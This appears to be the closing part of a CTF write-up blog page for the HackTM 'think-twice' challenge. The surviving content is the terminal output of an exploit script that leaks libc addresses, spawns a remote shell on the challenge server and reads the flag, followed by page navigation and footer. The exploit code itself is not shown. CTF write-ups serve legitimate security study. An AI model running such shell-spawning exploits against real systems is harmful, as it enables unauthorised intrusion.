+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">slashb4sh@ubuntu:~/HackTM/think-twice$ python exploit.py 
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Opening connection to 138.68.67.161 on port 20004: Done
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> stdin @ 0x7f9b57cdc8c0
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> libc base @ 0x7f9b57943000
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> execve @ 0x7f9b579fae80
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
+$ ls
+flag.txt
+libc.so
+loader.so
+run.sh
+think-speak
+$ cat flag.txt
+HackTM<span style="color:#f92672">{</span>th3_my5t3r13s_0f_th3_ELF_h4v3_b33n_r3v34l3d<span style="color:#f92672">}</span>
+</code></pre></div>
+
+
+                    </div>
+                </div>
+
+                
+                    <div class="col-sm-12 col-md-3">
+                        <nav id="TableOfContents" class="sticky-top">
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+                    </div>
+                
+            </div>
+
+            <div class="row">
+                <div
+                    
+                    class="col-md-9 col-lg-9"
+                    
+                >
+                    
+                        <div class="navigation">
+                            <div class="row">
+                                <div class="col-12 col-md-6">
+                                    
+                                        <div class="mx-0 mx-md-4 mt-4 text-left">
+                                            <a href="/blog/tcalc/">
+                                                <span class="icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 477.175 477.175">
+        <path d="M145.188,238.575l215.5-215.5c5.3-5.3,5.3-13.8,0-19.1s-13.8-5.3-19.1,0l-225.1,225.1c-5.3,5.3-5.3,13.8,0,19.1l225.1,225 c2.6,2.6,6.1,4,9.5,4s6.9-1.3,9.5-4c5.3-5.3,5.3-13.8,0-19.1L145.188,238.575z" />
+    </svg>
+</span>
+
+                                                <span class="text">TCalc - Hack.lu CTF 2019</span>
+                                            </a>
+                                        </div>
+                                    
+                                </div>
+                                <div class="col-12 col-md-6">
+                                    
+                                        <div class="mx-0 mx-md-4 mt-4 text-right">
+                                            <a href="/blog/win7kernelpoolinternals/">
+                                                <span class="text">Windows 7 Kernel Pool Internals</span>
+                                                <span class="icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 477.175 477.175">
+        <path d="M360.731,229.075l-225.1-225.1c-5.3-5.3-13.8-5.3-19.1,0s-5.3,13.8,0,19.1l215.5,215.5l-215.5,215.5 c-5.3,5.3-5.3,13.8,0,19.1c2.6,2.6,6.1,4,9.5,4c3.4,0,6.9-1.3,9.5-4l225.1-225.1C365.931,242.875,365.931,234.275,360.731,229.075z" />
+    </svg>
+</span>
+
+                                            </a>
+                                        </div>
+                                    
+                                </div>
+                            </div>
+                        </div>
+                    
+
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="my-4 footer">
+    <div class="container">
+        <div class="row justify-content-center">
+            <div class="col-sm-12 col-md-6 col-lg-5">
+                <div class="mx-0 mx-md-4 mb-2 text-center text-md-left">
+                    
+
+                    
+                </div>
+            </div>
+            <div class="col-sm-12 col-md-6 col-lg-5">
+                <div class="mx-0 mx-md-4 text-center text-md-right">
+                    
+
+                    
+
+                    
+    <a href="https://github.com/github.com/maheshhari"
+        target="_blank"
+        class="mx-1 ml-md-2 mr-md-0 icon"
+        aria-label="GitHub">
+
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill-rule="evenodd" clip-rule="evenodd" stroke-linejoin="round" stroke-miterlimit="1.414">
+            <path d="M8 0C3.58 0 0 3.582 0 8c0 3.535 2.292 6.533 5.47 7.59.4.075.547-.172.547-.385 0-.19-.007-.693-.01-1.36-2.226.483-2.695-1.073-2.695-1.073-.364-.924-.89-1.17-.89-1.17-.725-.496.056-.486.056-.486.803.056 1.225.824 1.225.824.714 1.223 1.873.87 2.33.665.072-.517.278-.87.507-1.07-1.777-.2-3.644-.888-3.644-3.953 0-.873.31-1.587.823-2.147-.09-.202-.36-1.015.07-2.117 0 0 .67-.215 2.2.82.64-.178 1.32-.266 2-.27.68.004 1.36.092 2 .27 1.52-1.035 2.19-.82 2.19-.82.43 1.102.16 1.915.08 2.117.51.56.82 1.274.82 2.147 0 3.073-1.87 3.75-3.65 3.947.28.24.54.73.54 1.48 0 1.07-.01 1.93-.01 2.19 0 .21.14.46.55.38C13.71 14.53 16 11.53 16 8c0-4.418-3.582-8-8-8"/>
+        </svg>
+    </a>
+
+
+                    
+
+                    
+    <a href="https://twitter.com/twitter.com/slashb4sh"
+        target="_blank"
+        class="mx-1 ml-md-2 mr-md-0 icon"
+        aria-label="Twitter">
+
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill-rule="evenodd" clip-rule="evenodd" stroke-linejoin="round" stroke-miterlimit="1.414">
+            <path d="M16 3.038c-.59.26-1.22.437-1.885.517.677-.407 1.198-1.05 1.443-1.816-.634.37-1.337.64-2.085.79-.598-.64-1.45-1.04-2.396-1.04-1.812 0-3.282 1.47-3.282 3.28 0 .26.03.51.085.75-2.728-.13-5.147-1.44-6.766-3.42C.83 2.58.67 3.14.67 3.75c0 1.14.58 2.143 1.46 2.732-.538-.017-1.045-.165-1.487-.41v.04c0 1.59 1.13 2.918 2.633 3.22-.276.074-.566.114-.865.114-.21 0-.41-.02-.61-.058.42 1.304 1.63 2.253 3.07 2.28-1.12.88-2.54 1.404-4.07 1.404-.26 0-.52-.015-.78-.045 1.46.93 3.18 1.474 5.04 1.474 6.04 0 9.34-5 9.34-9.33 0-.14 0-.28-.01-.42.64-.46 1.2-1.04 1.64-1.7z" fill-rule="nonzero"/>
+        </svg>
+    </a>
+
+
+                    
+
+                    
+
+                    
+
+                    
+    <a href="mailto:maheshpdm2@gmail.com"
+        class="mx-1 ml-md-2 mr-md-0 icon"
+        aria-label="Email">
+
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 14 16">
+            <path d="M0 4v8c0 .55.45 1 1 1h12c.55 0 1-.45 1-1V4c0-.55-.45-1-1-1H1c-.55 0-1 .45-1 1zm13 0L7 9 1 4h12zM1 5.5l4 3-4 3v-6zM2 12l3.5-3L7 10.5 8.5 9l3.5 3H2zm11-.5l-4-3 4-3v6z"/>
+        </svg>
+    </a>
+
+
+                    <a href=''
+    class="mx-1 ml-md-2 mr-md-0 icon"
+    aria-label="RSS">
+
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" fill-rule="evenodd" clip-rule="evenodd" stroke-linejoin="round" stroke-miterlimit="1.414">
+        <path d="M12.8 16C12.8 8.978 7.022 3.2 0 3.2V0c8.777 0 16 7.223 16 16h-3.2zM2.194 11.61c1.21 0 2.195.985 2.195 2.196 0 1.21-.99 2.194-2.2 2.194C.98 16 0 15.017 0 13.806c0-1.21.983-2.195 2.194-2.195zM10.606 16h-3.11c0-4.113-3.383-7.497-7.496-7.497v-3.11c5.818 0 10.606 4.79 10.606 10.607z"/>
+    </svg>
+</a>
+
+
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/highlight.min.js" integrity="sha256-1zu+3BnLYV9LdiY85uXMzii3bdrkelyp37e0ZyTAQh0=" crossorigin="anonymous"></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/bash.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/css.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/diff.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/django.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/javascript.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/python.min.js" defer></script>
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.15.10/languages/yaml.min.js" defer></script>
+        
+        <script>
+            window.addEventListener('load', function() {
+                hljs.initHighlighting();
+            }, true);
+        </script>
+    
+
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/progressively/1.2.5/progressively.min.js" integrity="sha256-LvFVlLdfGI3WeEH+8Ni4kxLm02g2GlOfeGCGLXfRk/U=" crossorigin="anonymous"></script>
+        <script>
+            window.addEventListener('load', function() {
+                progressively.init({delay: 30, throttle: 50});
+            }, true);
+        </script>
+    
+
+    
+
+    
+    
+</body>
+
+</html>
